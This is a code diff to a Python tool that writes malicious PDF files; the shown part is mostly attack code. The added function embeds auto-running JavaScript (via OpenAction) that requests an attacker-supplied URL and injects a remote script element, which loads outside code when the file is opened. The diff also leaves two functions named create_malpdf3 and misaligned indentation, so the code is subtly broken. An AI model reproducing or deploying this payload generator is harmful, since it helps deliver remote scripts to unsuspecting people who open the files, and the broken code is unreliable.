@@ -42,17 +42,29 @@ def create_malpdf3(filename, url):
         <</Root 1 0 R>>''')
         print("[+] Created malpdf3.pdf")
 
-def create_malpdf_input(filename, script):
+def create_malpdf3(filename, url):
     with open(filename, "w") as file:
-        file.write(f'''%PDF-1.7
+                file.write(f'''%PDF-1.7
         1 0 obj
         <</Pages 1 0 R /OpenAction 2 0 R>>
         2 0 obj
-        <</S /JavaScript /JS ({script}
+        <</S /JavaScript /JS (
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "{url}", true);
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState == 4 && xhr.status == 200) {{}}
+            else if (xhr.readyState == 4) {{}}
+        }};
+        xhr.send();
+        var script = "{url}";
+        var element = document.createElement('script'); 
+        element.src = script; 
+        document.body.appendChild(element);
         )>> 
         trailer
         <</Root 1 0 R>>''')
-        print("[+] Created xssPDF-sc.pdf")
+        print("[+] Created malpdf3.pdf")
+
 
                 
 def create_malhtml(filename):
